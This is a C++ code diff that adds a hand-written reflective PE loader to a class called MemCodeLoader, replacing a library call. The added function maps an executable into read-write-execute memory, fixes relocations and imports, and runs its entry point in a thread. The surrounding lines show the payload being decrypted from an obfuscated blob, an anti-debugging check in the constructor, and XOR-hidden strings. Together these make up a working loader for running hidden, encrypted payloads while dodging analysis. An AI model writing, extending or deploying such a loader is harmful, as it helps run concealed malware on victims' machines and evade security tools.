@@ -78,6 +78,105 @@ private:
         return VirtualProtect(address, size, protection, &oldProtect);
     }
     
+    // Custom PE loader based on memloader
+    bool LoadPEFromMemory(const uint8_t* peData, size_t peSize) {
+        __try {
+            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peData;
+            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+
+            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peData + dos->e_lfanew);
+            if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
+
+            SIZE_T size = nt->OptionalHeader.SizeOfImage;
+            BYTE* mem = (BYTE*)VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            if (!mem) return false;
+
+            memcpy(mem, peData, nt->OptionalHeader.SizeOfHeaders);
+
+            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+            for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+                if (sec->SizeOfRawData) {
+                    memcpy(mem + sec->VirtualAddress, peData + sec->PointerToRawData, sec->SizeOfRawData);
+                }
+            }
+
+            // Handle relocations
+            ULONG_PTR delta = (ULONG_PTR)(mem - nt->OptionalHeader.ImageBase);
+            if (delta && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
+                PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(mem +
+                    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+                SIZE_T processed = 0;
+                while (processed < nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
+                    DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                    WORD* list = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
+                    for (DWORD i = 0; i < count; i++) {
+                        WORD type_offset = list[i];
+                        WORD type = type_offset >> 12;
+                        WORD offset = type_offset & 0xFFF;
+                        BYTE* addr = mem + reloc->VirtualAddress + offset;
+
+                        if (type == IMAGE_REL_BASED_HIGHLOW)
+                            *(DWORD*)addr += (DWORD)delta;
+                        else if (type == IMAGE_REL_BASED_DIR64)
+                            *(ULONGLONG*)addr += delta;
+                    }
+                    processed += reloc->SizeOfBlock;
+                    reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
+                }
+            }
+
+            // Handle imports
+            if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
+                PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(mem +
+                    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+                while (imp->Name) {
+                    char* modName = (char*)(mem + imp->Name);
+                    HMODULE lib = LoadLibraryA(modName);
+                    if (!lib) return false;
+
+                    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(mem + imp->FirstThunk);
+                    PIMAGE_THUNK_DATA orig = imp->OriginalFirstThunk ?
+                        (PIMAGE_THUNK_DATA)(mem + imp->OriginalFirstThunk) : thunk;
+
+                    while (orig->u1.AddressOfData) {
+                        FARPROC proc = nullptr;
+                        if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
+                            proc = GetProcAddress(lib, (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
+                        } else {
+                            PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(mem + orig->u1.AddressOfData);
+                            proc = GetProcAddress(lib, name->Name);
+                        }
+
+                        if (!proc) return false;
+                        thunk->u1.Function = (ULONGLONG)proc;
+
+                        ++thunk;
+                        ++orig;
+                    }
+                    ++imp;
+                }
+            }
+
+            FlushInstructionCache(GetCurrentProcess(), mem, size);
+
+            // Execute entry point in separate thread
+            DWORD epRVA = nt->OptionalHeader.AddressOfEntryPoint;
+            void (*entry)() = (void(*)())(mem + epRVA);
+            
+            HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)entry, nullptr, 0, nullptr);
+            if (hThread) {
+                WaitForSingleObject(hThread, INFINITE);
+                CloseHandle(hThread);
+            }
+
+            VirtualFree(mem, 0, MEM_RELEASE);
+            return true;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            return false;
+        }
+    }
+    
 public:
     MemCodeLoader() {
         AntiDebugCheck();
@@ -99,7 +198,7 @@ public:
             auto decrypted = obfPE.Decrypt();
             
             // Use memloader to load the PE
-            if (loadbytes(decrypted.data(), decrypted.size())) {
+            if (LoadPEFromMemory(decrypted.data(), decrypted.size())) {
                 loadedModules.push_back(std::move(obfPE));
                 std::cout << xorstr_("[+] Module loaded from memory: ") << moduleName << std::endl;
                 return true;
